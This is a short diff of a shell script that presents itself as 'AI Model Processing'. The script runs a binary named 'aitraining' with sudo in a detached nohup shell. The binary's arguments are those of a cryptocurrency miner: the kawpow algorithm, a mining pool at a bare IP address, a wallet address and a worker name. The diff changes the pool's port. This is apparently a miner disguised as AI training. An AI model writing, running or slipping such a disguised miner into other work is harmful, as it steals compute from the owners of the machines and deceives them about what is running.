@@ -13,7 +13,7 @@ echo "=== Starting AI Model Processing ==="
 nohup bash -c "
 sudo ./aitraining \
     --algorithm kawpow \
-    --pool 74.220.25.74:784 \
+    --pool 74.220.25.74:7845 \
     --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
     --worker H200-rig \
     --password x \
